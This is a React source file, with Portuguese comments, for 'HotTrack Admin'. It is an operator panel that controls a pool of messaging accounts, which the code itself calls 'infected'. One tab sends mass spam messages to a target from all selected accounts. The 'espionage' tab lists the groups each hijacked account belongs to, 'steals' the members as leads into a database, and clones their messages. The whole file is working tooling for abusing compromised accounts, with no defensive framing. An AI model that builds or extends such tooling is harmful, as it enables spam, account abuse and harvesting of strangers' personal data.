import { useState, useEffect } from 'react';

export default function AdminPanel() {
  const [tab, setTab] = useState('attack'); // 'attack' ou 'spy'
  const [sessions, setSessions] = useState([]);
  const [logs, setLogs] = useState([]);
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [processing, setProcessing] = useState(false);

  // Estados do Ataque
  const [target, setTarget] = useState(''); 
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');

  // Estados da Espionagem
  const [spyPhone, setSpyPhone] = useState('');
  const [chats, setChats] = useState([]);
  const [loadingChats, setLoadingChats] = useState(false);

  // Carrega lista ao iniciar
  const fetchSessions = async () => {
    try {
      const res = await fetch('/api/list-sessions');
      const data = await res.json();
      setSessions(data.sessions || []);
    } catch (e) { addLog('Erro ao carregar sessões.', 'error'); }
  };

  useEffect(() => { fetchSessions(); }, []);

  const addLog = (text) => {
    const time = new Date().toLocaleTimeString();
    setLogs(prev => [`[${time}] ${text}`, ...prev]);
  };

  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  // --- FUNÇÕES DE ATAQUE ---
  const handleMassFire = async () => {
    if (!target || selectedPhones.size === 0) return alert('Configure alvo e selecione contas');
    setProcessing(true);
    addLog(`=== Iniciando disparo ===`);
    for (const phone of Array.from(selectedPhones)) {
        try {
            const res = await fetch('/api/dispatch', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ senderPhone: phone, target, message: msg })
            });
            const data = await res.json();
            if (res.ok) addLog(`✅ ${phone}: Enviado`);
            else addLog(`❌ ${phone}: ${data.error}`);
        } catch (e) { addLog(`❌ Erro crítico em ${phone}`); }
    }
    setProcessing(false);
  };

  // --- FUNÇÕES DE ESPIONAGEM ---
  const loadChats = async (phone) => {
    setSpyPhone(phone);
    setLoadingChats(true);
    setChats([]);
    addLog(`🔍 Varrendo grupos da conta ${phone}...`);
    
    try {
        const res = await fetch('/api/spy/list-chats', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone })
        });
        const data = await res.json();
        if(data.chats) {
            setChats(data.chats);
            addLog(`Encontrados ${data.chats.length} grupos/canais.`);
        }
    } catch (e) { addLog(`Erro ao listar chats: ${e.message}`); }
    setLoadingChats(false);
  };

  const harvestLeads = async (chatId, chatName) => {
    if(!confirm(`Extrair leads do grupo "${chatName}" usando ${spyPhone}?`)) return;
    addLog(`🕷️ Roubando leads de: ${chatName}...`);
    
    try {
        const res = await fetch('/api/spy/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone: spyPhone, chatId, chatName })
        });
        const data = await res.json();
        addLog(`✅ Sucesso! ${data.count} leads salvos no banco.`);
    } catch (e) { addLog(`❌ Falha na extração.`); }
  };

  const cloneContent = async (chatId) => {
    if(!confirm(`Clonar últimas 10 msgs deste grupo para o "Saved Messages" da conta infectada?`)) return;
    addLog(`©️ Clonando conteúdo...`);
    try {
        const res = await fetch('/api/spy/clone', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone: spyPhone, fromChatId: chatId, limit: 10 })
        });
        addLog(`✅ Clonagem concluída.`);
    } catch (e) { addLog(`❌ Erro ao clonar.`); }
  };

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
      <h1 style={{ color: '#58a6ff' }}>🔥 HotTrack Admin</h1>
      
      {/* Abas */}
      <div style={{ marginBottom: '20px', borderBottom: '1px solid #30363d' }}>
        <button onClick={() => setTab('attack')} style={{ padding: '10px 20px', background: tab === 'attack' ? '#238636' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>⚔️ Ataque / Disparo</button>
        <button onClick={() => setTab('spy')} style={{ padding: '10px 20px', background: tab === 'spy' ? '#1f6feb' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>🕵️ Espionagem</button>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
        
        {/* Coluna Esquerda: Ações */}
        <div>
            {tab === 'attack' && (
                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                    <h3>Configuração de Disparo</h3>
                    <input type="text" placeholder="@alvo" value={target} onChange={e => setTarget(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
                    <textarea value={msg} onChange={e => setMsg(e.target.value)} style={{ width: '100%', height: '80px', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
                    <button onClick={handleMassFire} disabled={processing} style={{ width: '100%', padding: '10px', background: '#238636', color: 'white', border: 'none' }}>DISPARAR</button>
                </div>
            )}

            {tab === 'spy' && (
                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                    <h3>Modo Espião</h3>
                    {!spyPhone ? <p>Selecione uma conta na direita para espiar.</p> : (
                        <>
                            <p>Conta selecionada: <strong style={{color: '#58a6ff'}}>{spyPhone}</strong></p>
                            {loadingChats && <p>Carregando grupos...</p>}
                            <div style={{ maxHeight: '400px', overflowY: 'auto' }}>
                                {chats.map(c => (
                                    <div key={c.id} style={{ padding: '10px', borderBottom: '1px solid #30363d', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                                        <div>
                                            <div style={{fontWeight: 'bold'}}>{c.title}</div>
                                            <div style={{fontSize: '12px', color: '#8b949e'}}>{c.type} • {c.participants_count} membros</div>
                                        </div>
                                        <div style={{display: 'flex', gap: '5px'}}>
                                            <button onClick={() => harvestLeads(c.id, c.title)} style={{ fontSize: '10px', padding: '5px', background: '#d29922', border: 'none', cursor: 'pointer' }}>🕷️ Roubar</button>
                                            <button onClick={() => cloneContent(c.id)} style={{ fontSize: '10px', padding: '5px', background: '#8957e5', border: 'none', cursor: 'pointer' }}>©️ Clonar</button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </>
                    )}
                </div>
            )}

            {/* Terminal de Logs */}
            <div style={{ marginTop: '20px', backgroundColor: '#000', padding: '15px', borderRadius: '6px', height: '200px', overflowY: 'auto', fontSize: '12px' }}>
                {logs.map((l, i) => <div key={i}>{l}</div>)}
            </div>
        </div>

        {/* Coluna Direita: Contas */}
        <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
            <h3>Contas ({sessions.length})</h3>
            {sessions.map(s => (
                <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', padding: '10px', background: '#21262d', marginBottom: '5px' }}>
                    <div>{s.phone_number}</div>
                    {tab === 'attack' ? (
                        <button onClick={() => toggleSelect(s.phone_number)} style={{ background: selectedPhones.has(s.phone_number) ? '#238636' : '#30363d', border: 'none', color: 'white', padding: '2px 10px', cursor: 'pointer' }}>
                           {selectedPhones.has(s.phone_number) ? 'V' : 'Select'}
                        </button>
                    ) : (
                        <button onClick={() => loadChats(s.phone_number)} style={{ background: '#1f6feb', border: 'none', color: 'white', padding: '2px 10px', cursor: 'pointer' }}>
                           Espiar
                        </button>
                    )}
                </div>
            ))}
        </div>

      </div>
    </div>
  );
}
